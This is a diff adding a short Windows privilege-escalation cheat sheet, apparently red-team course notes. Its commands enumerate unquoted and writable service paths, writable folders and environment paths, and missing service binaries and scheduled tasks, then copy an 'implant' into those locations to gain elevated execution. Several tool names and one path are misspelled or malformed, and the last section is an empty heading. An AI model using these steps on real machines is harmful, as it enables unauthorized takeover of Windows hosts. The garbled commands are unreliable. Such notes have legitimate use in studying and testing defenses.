@@ -1,0 +1,50 @@
+Privilege Escalation
+--------------------
+
+1) unsecured services
+cmd > wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
+
+any service with high privilege and have read write permissions
+any registry with high privilege and have read write permissions
+change the path of that exe to implant
+
+
+2) enumerate all files and folders on the C:\ drive that the "Users" group has write permissions 
+cmd > accsschk.exe -accepteula -wus "Users" c:\*.* > output.txt 
+cmd > accsschk.exe -accepteula -wus "Users" c:\*.* > output2.txt
+
+3) using env variables
+cmd > reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"
+ 
+and see which path can be modified by user or authenticated user
+
+cmd > copy c:\windows\system32\implant.exe c:rto\bin\notepad.exe
+
+
+4) Missing service binaries
+
+if a service binary is missing copy the pauload into the missing binary with same missing binary name and then execute
+
+cmd > autorubsc64.exe -a s | more
+then coping implant into binary  and rebooting 
+
+5) missing task
+cmd > autorubsc64.exe -a t | more
+
+
+to know details of missing task
+cmd > schtask /query /tn missingtaskexample /xml 
+
+next check weather missing task exists or not
+cmd > dir c:\path\name\from\xml
+
+if not found copy implant to the missing exe and execute
+
+cmd > copy implant.exe "C:\path\to\missingexecutable.exe"
+
+
+6) alwaysInstalledElevated
+
+
+
+
